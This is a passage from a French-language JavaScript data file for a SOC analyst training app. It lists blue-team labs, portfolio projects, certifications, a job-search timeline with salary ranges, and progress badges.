    { id: "lab1", titre: "TryHackMe — Pre-Security Path", module: "m1", difficulte: "débutant", duree: "10h", type: "plateforme", desc: "Réseau, web, Linux et Windows pour débutants. Point d'entrée obligatoire.", tags: ["Réseau","Linux","Windows","Web"] },
    { id: "lab2", titre: "TryHackMe — SOC Level 1", module: "m5", difficulte: "intermédiaire", duree: "40h", type: "plateforme", desc: "Parcours officiel SOC L1 : Splunk, Incident Response, Threat Intelligence, Wireshark.", tags: ["SIEM","Splunk","IR","Threat Intel"] },
    { id: "lab3", titre: "LetsDefend.io — SOC Analyst", module: "m5", difficulte: "intermédiaire", duree: "Variable", type: "plateforme", desc: "Simulateur de SOC avec vraies alertes : phishing, malware, brute force. Le plus proche du terrain.", tags: ["SOC","Triage","EDR","Alertes"] },
    { id: "lab4", titre: "Splunk BOTS v1 — Boss of the SOC", module: "m5", difficulte: "avancé", duree: "20h", type: "challenge", desc: "Dataset réaliste d'une attaque simulée à investiguer avec Splunk. Référence absolue.", tags: ["Splunk","SPL","SOC","CTF"] },
    { id: "lab5", titre: "CyberDefenders — Network Forensics", module: "m3", difficulte: "intermédiaire", duree: "5h", type: "challenge", desc: "Analyser des PCAP de malwares réels. Identifier le type d'attaque et extraire les IOC.", tags: ["Wireshark","PCAP","Forensics"] },
    { id: "lab6", titre: "CyberDefenders — Forensics (Windows)", module: "m6", difficulte: "avancé", duree: "8h", type: "challenge", desc: "Images disque Windows à investiguer avec Autopsy. Artefacts, timeline, rapport.", tags: ["Forensics","Autopsy","Windows","DFIR"] },
    { id: "lab7", titre: "Malware Traffic Analysis — PCAP", module: "m3", difficulte: "intermédiaire", duree: "Variable", type: "challenge", desc: "malware-traffic-analysis.net : centaines de PCAP réels de malwares à analyser.", tags: ["Wireshark","Malware","PCAP","IOC"] },
    { id: "lab8", titre: "BloodHound — Lab Active Directory", module: "m2", difficulte: "intermédiaire", duree: "15h", type: "lab_perso", desc: "Monter un AD en VM, collecter avec SharpHound, analyser les chemins d'attaque.", tags: ["AD","BloodHound","Kerberos","Windows Server"] },
    { id: "lab9", titre: "TryHackMe — Phishing Analysis", module: "m1", difficulte: "débutant", duree: "4h", type: "plateforme", desc: "Analyser des emails de phishing réels, headers, SPF/DKIM/DMARC, URLs, sandbox.", tags: ["Phishing","Email","SPF","DMARC"] },
    { id: "lab10", titre: "Blue Team Labs Online", module: "m5", difficulte: "intermédiaire", duree: "Variable", type: "plateforme", desc: "Labs Blue Team : forensics, logs, IR. Niveaux progressifs avec scoring.", tags: ["Blue Team","Logs","Forensics"] },
    { id: "lab11", titre: "Microsoft Sentinel — Lab gratuit", module: "m2", difficulte: "intermédiaire", duree: "6h", type: "lab_perso", desc: "Trial Microsoft Sentinel (30 jours gratuits). Connecter des sources, écrire des requêtes KQL, créer des alertes.", tags: ["Sentinel","Azure AD","KQL","Cloud"] },
    { id: "lab12", titre: "MalwareBazaar — Analyse statique/sandbox", module: "m6", difficulte: "avancé", duree: "Variable", type: "challenge", desc: "Télécharger des samples depuis MalwareBazaar. Analyser avec pestudio + Any.run. Extraire les IOC.", tags: ["Malware","pestudio","sandbox","IOC","YARA"] }
  ],

  // ─────────────────────────────────────────────────────────
  // PROJETS PORTFOLIO
  // ─────────────────────────────────────────────────────────
  projets: [
    { id: "p1", num: "01", titre: "Home Lab SOC avec ELK Stack", desc: "Monter un SIEM ELK (ou Splunk Free) qui collecte les logs de VMs Windows + Linux avec Sysmon. Créer des tableaux de bord et des règles de détection pour les attaques courantes.", skills: ["ELK Stack","Sysmon","Splunk","SIEM","Dashboarding"], duree: "3–4 semaines", impact: "Démontre la capacité à construire et opérer un SIEM — différenciateur n°1" },
    { id: "p2", num: "02", titre: "Analyse de malware documentée", desc: "Analyser 3 samples depuis MalwareBazaar (famille connue). Rapport complet pour chaque : analyse statique (strings, PE headers), dynamique (sandbox), IOC extraits, règle YARA, famille identifiée.", skills: ["Malware Analysis","pestudio","Any.run","YARA","IOC"], duree: "2 semaines", impact: "Livrable concret prouvant les compétences en analyse de menaces" },
    { id: "p3", num: "03", titre: "Rapport d'investigation forensique", desc: "Résoudre un challenge DFIR (CyberDefenders) et rédiger un rapport d'investigation professionnel complet : timeline, artefacts, conclusions, recommandations.", skills: ["DFIR","Autopsy","Timeline","Rapport"], duree: "1–2 semaines", impact: "Montre la capacité à documenter et communiquer une investigation" },
    { id: "p4", num: "04", titre: "3 Playbooks de réponse aux incidents", desc: "Rédiger des playbooks complets pour : phishing email, brute force SSH réussi, malware détecté par EDR. Avec arbres de décision, étapes PICERL, communication, et checklist RGPD.", skills: ["Incident Response","Playbook","PICERL","Documentation"], duree: "1 semaine", impact: "Livrables directement réutilisables, prouvent la maturité processus" },
    { id: "p5", num: "05", titre: "Script Python d'enrichissement IOC", desc: "Script Python qui lit une liste d'IOC (IP, domaines, hashes), les enrichit via les API VirusTotal et AbuseIPDB, et génère un rapport HTML avec verdict et contexte.", skills: ["Python","API","Automation","Threat Intel"], duree: "1 semaine", impact: "Compétence scripting + TI très recherchée en SOC" },
    { id: "p6", num: "06", titre: "Lab Active Directory + détection attaques", desc: "Monter un AD avec Windows Server en VM. Simuler Kerberoasting, Pass-the-Hash. Les détecter dans les Event Logs. Créer les règles Splunk correspondantes.", skills: ["Active Directory","Kerberos","Splunk","Detection"], duree: "3 semaines", impact: "AD = 80% des entreprises. Connaissance théorie + pratique = fort" },
    { id: "p7", num: "07", titre: "CTF Write-ups documentés (5+)", desc: "Participer à 5+ CTF Blue Team (TryHackMe, CyberDefenders, BOTS). Rédiger un write-up détaillé pour chaque : problème, approche, outils, solution, leçons apprises.", skills: ["CTF","Documentation","Problem Solving","GitHub"], duree: "Continue", impact: "Visibilité publique + preuve de pratique régulière" },
    { id: "p8", num: "08", titre: "Dashboard de surveillance réseau", desc: "Avec Grafana ou Kibana : créer un dashboard qui visualise le trafic réseau, les alertes et les anomalies en temps réel depuis ton lab.", skills: ["Grafana","Kibana","Visualisation","Monitoring"], duree: "2 semaines", impact: "Compétences de visualisation appréciées en SOC" },
    { id: "p9", num: "09", titre: "Rapport Threat Hunt documenté", desc: "Conduire un hunt complet sur le dataset BOTS ou CyberDefenders avec hypothèse MITRE ATT&CK. Documenter : hypothèse, requêtes SPL, résultats, règle créée.", skills: ["Threat Hunting","Splunk","MITRE ATT&CK","SPL"], duree: "1–2 semaines", impact: "Différenciateur fort pour postes SOC L2" },
    { id: "p10", num: "10", titre: "Portfolio GitHub professionnel", desc: "Organiser tous les projets sur GitHub avec README soignés, descriptions claires, captures d'écran des résultats. Une page README principale avec présentation personnelle et navigation.", skills: ["GitHub","Documentation","Markdown","Personal Branding"], duree: "Continue", impact: "Première chose regardée par un recruteur technique" }
  ],

  // ─────────────────────────────────────────────────────────
  // CERTIFICATIONS
  // ─────────────────────────────────────────────────────────
  certifications: [
    { id: "cert1", titre: "CompTIA Security+", org: "CompTIA", niveau: "fondamental", couleur: "#6366f1", mois_ideal: "Mois 4–5", duree_prep: "2–3 mois", cout: "~370€", validite: "3 ans", desc: "La certification de base la plus reconnue mondialement. Exigée par de nombreux employeurs comme prérequis. Couvre : menaces, réseau, crypto, gestion des identités, conformité.", prerequis_recommandes: ["Modules 1, 2, 3 terminés"], ressources: ["Professor Messer (gratuit sur YouTube)", "CompTIA CertMaster", "TryHackMe Jr Pen Tester path", "Darril Gibson book"] },
    { id: "cert2", titre: "Blue Team Level 1 (BTL1)", org: "Security Blue Team", niveau: "intermédiaire", couleur: "#3b82f6", mois_ideal: "Mois 7–8", duree_prep: "2–3 mois", cout: "~400€", validite: "À vie", desc: "Certification 100% pratique Blue Team. Examen de 24h en conditions réelles. Couvre : phishing analysis, SIEM, Threat Intel, forensics, IR. La meilleure certification terrain pour un SOC L1.", prerequis_recommandes: ["Module 5 en cours", "BTL1 > CySA+ pour la pratique terrain"], ressources: ["BTL1 course (inclus)", "TryHackMe SOC Level 1", "LetsDefend.io", "Blue Team Labs Online"] },
    { id: "cert3", titre: "Splunk Core Certified User", org: "Splunk", niveau: "intermédiaire", couleur: "#10b981", mois_ideal: "Mois 6–7", duree_prep: "3–4 semaines", cout: "~130€", validite: "3 ans", desc: "Valide la maîtrise de Splunk SPL. Très valorisée car Splunk est le SIEM le plus déployé en entreprise. Passer tôt pour renforcer les compétences SIEM.", prerequis_recommandes: ["Module 5 en cours"], ressources: ["Splunk Education (cours gratuits)", "BOTS challenges", "TryHackMe Splunk rooms"] },
    { id: "cert4", titre: "CompTIA CySA+", org: "CompTIA", niveau: "intermédiaire", couleur: "#06b6d4", mois_ideal: "Mois 8–9", duree_prep: "2–3 mois", cout: "~370€", validite: "3 ans", desc: "Certification SOC analyst orientée threat intelligence, analyse comportementale, gestion des vulnérabilités. Reconnue mais plus théorique que BTL1. Bonne pour les environnements qui l'exigent.", prerequis_recommandes: ["Security+", "Module 5 terminé"], ressources: ["CompTIA CertMaster", "Mike Chapple book", "TryHackMe CySA+ path"] },
    { id: "cert5", titre: "Microsoft SC-200", org: "Microsoft", niveau: "intermédiaire", couleur: "#0078d4", mois_ideal: "Mois 8–9", duree_prep: "2 mois", cout: "~165€", validite: "1 an (renouvelable gratuitement)", desc: "Microsoft Security Operations Analyst. Couvre : Defender for Endpoint, Microsoft Sentinel (KQL), Defender for Cloud. Indispensable si l'environnement cible utilise Microsoft Sentinel.", prerequis_recommandes: ["Module 2 (Azure AD) terminé", "Notions KQL"], ressources: ["Microsoft Learn (gratuit)", "John Savill SC-200 YouTube", "Microsoft Sentinel trial"] },
    { id: "cert6", titre: "GCFE — GIAC Forensic Examiner", org: "GIAC / SANS", niveau: "avancé", couleur: "#f59e0b", mois_ideal: "Mois 11–12", duree_prep: "3–6 mois", cout: "~2000€", validite: "4 ans", desc: "Certification forensique de référence. Pour la spécialisation DFIR. Très reconnue mais coûteuse. Considérer le SANS Work Study program pour réduction de coût.", prerequis_recommandes: ["Module 6 terminé", "Expérience pratique forensique"], ressources: ["SANS FOR508 course", "CyberDefenders challenges", "DFIR.training"] }
  ],

  // ─────────────────────────────────────────────────────────
  // STRATÉGIE EMPLOI
  // ─────────────────────────────────────────────────────────
  emploi: {
    timeline: [
      { periode: "Mois 1–3", titre: "Fondations + visibilité", actions: ["Modules 1 et 2 en cours", "Créer son profil LinkedIn avec objectif SOC clair", "Rejoindre les communautés : Discord TryHackMe, Slack CyberDéfense FR, r/netsec", "TryHackMe Pre-Security + Phishing Analysis paths", "Créer son compte GitHub et le rendre public"] },
      { periode: "Mois 4–6", titre: "Compétences core + premières certifications", actions: ["Passer Security+ (Mois 4–5)", "Modules 3 et 4 en cours", "Construire le Home Lab SOC ELK (Projet P1)", "LetsDefend.io : 20 alertes traitées et documentées", "Premiers write-ups publiés sur GitHub", "Commencer Splunk BOTS"] },
      { periode: "Mois 6–9", titre: "Spécialisation SOC + portfolio", actions: ["Passer Splunk Core Certified User (Mois 7)", "Passer BTL1 (Mois 8)", "Module 5 terminé", "3 projets portfolio solides sur GitHub", "Commencer à postuler : Helpdesk / IT Support avec objectif SOC annoncé", "Networking : SSTIC, Forum FIC, meetups CLUSIF/CLUSIRA"] },
      { periode: "Mois 9–12", titre: "Candidatures SOC actives", actions: ["Module 6 terminé (DFIR)", "Portfolio GitHub complet (10 projets)", "Passer SC-200 ou CySA+ (selon l'environnement cible)", "Postuler activement aux postes SOC Analyst L1", "Préparer les entretiens techniques (questions de ce cours)", "Contacter des analystes SOC sur LinkedIn pour des coffee chats"] }
    ],
    postes_cibles: [
      { titre: "IT Support / Helpdesk N1-N2", quand: "Mois 1–6 si reconversion totale", salaire: "24–32k€", desc: "Tremplin si aucune expérience IT. Développer les bases en situation réelle. Annoncer l'objectif SOC dès l'entretien." },
      { titre: "SOC Analyst Level 1", quand: "Mois 6–12", salaire: "30–42k€", desc: "Poste cible principal. Triage d'alertes SIEM/EDR, monitoring, gestion des incidents courants, playbooks." },
      { titre: "Security Analyst", quand: "Mois 9–12", salaire: "35–50k€", desc: "Profil plus large : gestion des vulnérabilités + défense. Pour les profils avec bases techniques solides." },
      { titre: "SOC Analyst Level 2", quand: "12–24 mois d'expérience L1", salaire: "42–60k€", desc: "Investigation approfondie, threat hunting, forensique, formation des L1. Objectif 2 ans." }
    ],
    conseils: [
      "Ne pas attendre d'être 'prêt' — postuler dès le mois 6 pour apprendre à se pitcher et avoir des retours.",
      "Le portfolio pratique > les certifications seules. 3 projets documentés sur GitHub = plus fort que 5 certifications sans pratique.",
      "Mentionner LetsDefend et BOTS en entretien : 'J'ai traité X alertes sur LetsDefend' = preuve de pratique concrète.",
      "Les ESN (Sopra, Atos, Capgemini, Thales, Airbus CyberSecurity) recrutent des juniors SOC pour former en interne.",
      "MSSP (Managed Security Service Providers) = meilleure école : volume d'incidents élevé, formations fournies.",
      "Cibler les offres avec la mention 'junior' ou 'débutant accepté' et celles qui citent des outils que tu maîtrises.",
      "Préparer une réponse STAR pour 'Décrivez une investigation que vous avez conduite' (BOTS, CyberDefenders).",
      "LinkedIn : publier 1 post par semaine sur un sujet de cybersécurité = visibilité passive auprès des recruteurs."
    ]
  },

  // ─────────────────────────────────────────────────────────
  // BADGES
  // ─────────────────────────────────────────────────────────
  badges: [
    { id: "b1", emoji: "🚀", nom: "Premier pas", desc: "Commencer le premier cours", condition: (p) => Object.values(p).some(v => v !== "non_commence") },
    { id: "b2", emoji: "🌐", nom: "Fondations", desc: "Maîtriser tous les Fondamentaux IT", condition: (p) => ["m1c1","m1c2","m1c3","m1c4","m1c5","m1c6"].every(id => p[id] && p[id] !== "non_commence") },
    { id: "b3", emoji: "🏰", nom: "Défenseur AD", desc: "Maîtriser le module Systèmes & AD", condition: (p) => ["m2c1","m2c2","m2c3","m2c4"].every(id => p[id] === "maitrise") },
    { id: "b4", emoji: "🔍", nom: "Analyste Réseau", desc: "Maîtriser le module Réseau", condition: (p) => ["m3c1","m3c2","m3c3"].every(id => p[id] === "maitrise") },
    { id: "b5", emoji: "🛡", nom: "SOC Opérationnel", desc: "Maîtriser le module SOC/Blue Team", condition: (p) => ["m5c1","m5c2","m5c3","m5c4"].every(id => p[id] === "maitrise") },
    { id: "b6", emoji: "🔬", nom: "Investigateur", desc: "Maîtriser le module Investigation", condition: (p) => ["m6c1","m6c2","m6c3"].every(id => p[id] === "maitrise") },
    { id: "b7", emoji: "⚡", nom: "Praticien", desc: "Compléter 5 labs", condition: (_, labs) => labs.length >= 5 },
    { id: "b8", emoji: "💼", nom: "Portfoliste", desc: "Compléter 3 projets portfolio", condition: (_, __, proj) => proj.length >= 3 },
    { id: "b9", emoji: "📧", nom: "Anti-Phishing", desc: "Maîtriser l'analyse phishing", condition: (p) => p["m1c6"] === "maitrise" },
    { id: "b10", emoji: "🎯", nom: "SOC Ready", desc: "Maîtriser 15+ compétences", condition: (p) => Object.values(p).filter(v => v === "maitrise").length >= 15 },
    { id: "b11", emoji: "🏆", nom: "Expert", desc: "Maîtriser 25+ compétences", condition: (p) => Object.values(p).filter(v => v === "maitrise").length >= 25 }
  ]
};
